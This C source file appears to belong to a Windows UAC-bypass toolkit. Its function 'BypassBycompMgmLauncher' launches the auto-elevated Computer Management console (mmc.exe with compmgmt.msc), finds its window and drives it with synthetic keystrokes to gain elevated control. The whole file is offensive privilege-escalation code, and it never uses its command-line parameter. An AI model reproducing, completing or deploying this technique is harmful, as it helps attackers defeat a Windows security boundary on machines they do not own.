#include "pch.h"

VOID EmulateKeyboard()
{
	SendControlInput('A', FALSE, TRUE);
	SendControlInput(VK_DOWN, FALSE, FALSE);
	SendControlInput(VK_DOWN, FALSE, FALSE);
	SendControlInput(VK_RETURN, FALSE, FALSE);
	SendStringInput("C:\\Windows\\System32");

	return;
}

static VOID BypassBycompMgmLauncher
(
	_In_ LPWSTR lpCommandLine
)
{
	WCHAR wszMmcPath[MAX_PATH];
	WCHAR wszMmcParameter[0x100];
	SHELLEXECUTEINFOW ShellExeInfo;
	PROCESS_BASIC_INFORMATION ProcessInfo;
	ULONG ReturnLength = 0;
	HWND hWnd = NULL;
	HWND hMMCWnd = NULL;

	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\mmc.exe", wszMmcPath, sizeof(wszMmcPath) / sizeof(WCHAR));
	ExpandEnvironmentStringsW(L" \"%WINDIR%\\System32\\compmgmt.msc\" /s", wszMmcParameter, sizeof(wszMmcParameter) / sizeof(WCHAR));

	ZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShellExeInfo.lpFile = wszMmcPath;
	ShellExeInfo.lpParameters = wszMmcParameter;
	ShellExeInfo.nShow = SW_SHOW;
	NTSTATUS Status = 0;

	if (!ShellExecuteExW(&ShellExeInfo)) {
		goto END;
	}

	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
	Status = NtQueryInformationProcess(ShellExeInfo.hProcess, ProcessBasicInformation, &ProcessInfo, sizeof(ProcessInfo), &ReturnLength);
	if (!NT_SUCCESS(Status)) {
		goto END;
	}
	
	Sleep(1000);
	hMMCWnd = GetWindowHandle(ProcessInfo.UniqueProcessId, L"MMCMainFrame", L"Computer Management", EmulateKeyboard);
END:
	if (ShellExeInfo.hProcess != NULL) {
		CloseHandle(ShellExeInfo.hProcess);
	}
}